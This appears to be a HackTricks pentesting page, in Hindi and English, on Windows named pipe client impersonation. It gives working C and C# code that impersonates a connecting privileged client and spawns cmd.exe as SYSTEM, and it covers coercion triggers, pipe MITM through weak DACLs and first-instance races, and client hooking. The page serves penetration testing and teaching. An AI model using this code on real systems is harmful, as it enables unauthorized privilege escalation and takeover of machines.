# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation एक local privilege escalation primitive है, जो named-pipe server thread को उस client की security context adopt करने देता है जो उससे connect करता है। व्यवहार में, एक attacker जो SeImpersonatePrivilege के साथ code चला सकता है, एक privileged client (जैसे SYSTEM service) को attacker-controlled pipe से connect कराने के लिए मजबूर कर सकता है, ImpersonateNamedPipeClient call कर सकता है, resulting token को primary token में duplicate कर सकता है, और client के रूप में process spawn कर सकता है (अक्सर NT AUTHORITY\SYSTEM)।

यह page core technique पर focus करती है। SYSTEM को आपके pipe से connect कराने वाली end-to-end exploit chains के लिए, नीचे refer किए गए Potato family pages देखें।

## TL;DR
- एक named pipe बनाएं: \\.\pipe\<random> और connection का wait करें।
- किसी privileged component को इससे connect कराएं (spooler/DCOM/EFSRPC/etc.)।
- Pipe से कम से कम एक message read करें, फिर ImpersonateNamedPipeClient call करें।
- Current thread से impersonation token open करें, DuplicateTokenEx(TokenPrimary) करें, और SYSTEM process पाने के लिए CreateProcessWithTokenW/CreateProcessAsUser करें।

## Requirements and key APIs
- Calling process/thread के लिए आमतौर पर आवश्यक privileges:
- SeImpersonatePrivilege, connecting client को successfully impersonate करने और CreateProcessWithTokenW use करने के लिए।
- Alternatively, SYSTEM को impersonate करने के बाद, आप CreateProcessAsUser use कर सकते हैं, जिसके लिए SeAssignPrimaryTokenPrivilege और SeIncreaseQuotaPrivilege की आवश्यकता हो सकती है (जब आप SYSTEM को impersonate कर रहे होते हैं, तब ये satisfied होते हैं)।
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation से पहले कम से कम एक message read करना जरूरी है)
- ImpersonateNamedPipeClient और RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW या CreateProcessAsUser
- Impersonation level: locally useful actions perform करने के लिए, client को SecurityImpersonation allow करना चाहिए (local RPC/named-pipe clients के लिए default कई बार यही होता है)। Pipe खोलते समय client इसे SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ lower कर सकता है।

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- यदि ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) लौटाता है, तो सुनिश्चित करें कि आपने पहले pipe से read किया है और client ने impersonation को Identification level तक restrict नहीं किया है।
- प्राथमिक token बनाने के लिए जो process creation के लिए suitable हो, DuplicateTokenEx को SecurityImpersonation और TokenPrimary के साथ prefer करें।

## .NET quick example
.NET में, NamedPipeServerStream RunAsClient के जरिए impersonate कर सकता है। एक बार impersonating होने पर, thread token को duplicate करें और एक process create करें।
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
ये techniques privileged services को आपके named pipe से connect करने के लिए coerce करती हैं ताकि आप उनका impersonate कर सकें:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

जब एक privileged service और एक low-privileged process `\\.\pipe\...` पर communicate करते हैं, तो pipe को किसी भी अन्य untrusted IPC boundary की तरह treat करें। Classic server-side impersonation के अलावा, weak pipe ACLs, unsafe creation flags, और client-side trust decisions भी local privilege escalation primitives बन सकते हैं।

### Enumerate candidate pipes first
- PowerShell से pipes जल्दी list करें: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` instance counts और single-instance pipes पहचानने के लिए useful है।
- उन names को prioritize करें जो `SYSTEM` के रूप में चलने वाली services इस्तेमाल करती हैं, खासकर helpers, updaters, launchers, और UI brokers।

### MITM via permissive DACLs and extra pipe instances
- कोई भी process जो privileged server से बात कर सकता है, पहले से ही उसके protocol को fuzz कर सकता है और privileged verbs खोज सकता है।
- ज्यादा interesting case तब है जब DACL pipe object पर `FILE_GENERIC_WRITE`/`GENERIC_WRITE` grant करता है। Named pipes में यह implicitly `FILE_CREATE_PIPE_INSTANCE` शामिल करता है (`FILE_APPEND_DATA` same bit share करता है), इसलिए attacker उसी नाम की एक और server instance create कर सकता है।
- क्योंकि instances FIFO order में match होते हैं, attacker-created और legitimate instances interleave हो सकते हैं: `CreateNamedPipe` से rogue instance बनाएं, फिर `CreateFile` से same pipe name open करें, और wait करें कि कोई real client rogue server instance पर land करे।
- Result: original server process को own किए बिना privileged IPC observe, modify, relay, या desynchronize करें।

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` pipe name की DACL सिर्फ first instance create होने पर define करता है।
- अगर कोई privileged service late start होता है और `FILE_FLAG_FIRST_PIPE_INSTANCE` use नहीं करता, तो attacker permissive DACL के साथ pipe name pre-create कर सकता है, फिर service को attacker-chosen security context के तहत later instances create करने दे सकता है।
- इससे service startup एक race condition बन जाता है: first instance जीतें, फिर weakened ACL के साथ later clients connect करें या MITM करें।
- Defenders के लिए mitigation, और attackers के लिए key review point: check करें कि `CreateNamedPipe(..., dwOpenMode, ...)` में `FILE_FLAG_FIRST_PIPE_INSTANCE` शामिल है या नहीं। अगर नहीं, तो service start होने से पहले pre-creation test करें।

### PID/signature checks are hardening, not a boundary
- कुछ products `GetNamedPipeClientProcessId`, process image path, या connecting client के Authenticode signer check करके access restrict करने की कोशिश करते हैं।
- यह तब तक ही मदद करता है जब तक आप legitimate client में inject नहीं कर देते: trusted process के अंदर जाते ही, आप वही PID/image/signature context inherit करते हैं जिसकी server को उम्मीद होती है।
- Split desktop apps के लिए, low-privileged UI/helper process को instrument करना अक्सर `SYSTEM` service पर सीधे attack करने से आसान होता है।

### Hook the client according to its I/O model
- Synchronous I/O: syscall buffer consume करने से पहले `NtWriteFile` intercept करें, और return होने के बाद `NtReadFile` inspect/patch करें।
- Overlapped I/O: `NtReadFile` में दिखे `OVERLAPPED`/`IoStatusBlock` को store करें, फिर `GetOverlappedResult` या relevant wait complete होने के बाद buffer inspect करें।
- Completion ports: `GetQueuedCompletionStatus` `NtRemoveIoCompletion` तक पहुंचता है; returned `ApcContext` original read में used `OVERLAPPED` से link करता है, जो now-populated buffer तक पहुंचने का सही pivot है।
- Completion routines (`ReadFileEx`): completion callback APC के रूप में delivered होता है। अगर आप returned data tamper करना चाहते हैं या synthetic replies inject करना चाहते हैं, तो real completion routine hook करें और custom injection के लिए one-argument `QueueUserAPC` dispatcher use करें जो routine के 3 expected arguments reconstruct करता है।

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) injected helper DLL के through named-pipe traffic proxy करता है और editing/replay के लिए Burp-like workflow expose करता है।
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) Frida-based approach use करता है और ऊपर वाले async/completion pivots के साथ `NtReadFile`/`NtWriteFile` hooking पर focus करता है, फिर traffic को WebSocket-backed editing workflow में forward करता है।
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational विचार
- Named pipes low-latency होती हैं; buffers edit करते समय लंबे pauses brittle services को deadlock कर सकते हैं।
- Overlapped/completion-port/APC-driven clients को simple `ReadFile`/`WriteFile` detours से अलग hooks चाहिए।
- trusted client में injection noisy होती है और आम तौर पर exploit development, protocol reversing, या local lab fuzzing के लिए ही बेहतर रहती है।

## Troubleshooting and gotchas
- `ImpersonateNamedPipeClient` कॉल करने से पहले आपको pipe से कम से कम एक message पढ़ना होगा; वरना आपको `ERROR_CANNOT_IMPERSONATE` (1368) मिलेगा।
- अगर client `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION` के साथ connect करता है, तो server पूरी तरह impersonate नहीं कर सकता; `GetTokenInformation(TokenImpersonationLevel)` के जरिए token का impersonation level check करें।
- `CreateProcessWithTokenW` के लिए caller पर `SeImpersonatePrivilege` चाहिए। अगर यह `ERROR_PRIVILEGE_NOT_HELD` (1314) के साथ fail होता है, तो पहले SYSTEM impersonate करने के बाद `CreateProcessAsUser` का उपयोग करें।
- अगर आप pipe को harden करते हैं, तो सुनिश्चित करें कि उसका security descriptor target service को connect करने दे; by default, `\\.\pipe` के नीचे pipes server की DACL के अनुसार accessible होती हैं।

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
